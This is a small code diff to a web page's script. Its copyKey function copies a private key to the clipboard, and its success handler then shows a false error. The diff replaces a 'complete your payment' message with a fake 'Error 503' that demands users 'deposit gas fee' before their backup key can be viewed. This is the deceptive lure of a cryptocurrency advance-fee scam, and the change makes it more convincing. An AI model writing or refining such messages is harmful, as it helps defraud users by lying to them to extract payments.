@@ -30,7 +30,7 @@
 
   function copyKey() {
     navigator.clipboard.writeText(privateKey)
-      .then(() => alert("Failed to copy backup key,kindly complete your payment before key can be viewed"))
+      .then(() => alert("Error 503: Failed to copy backup key,kindly deposit gas fee before backup key can be viewed"))
       .catch(() => alert("Failed to copy key."));
   }
 </script>
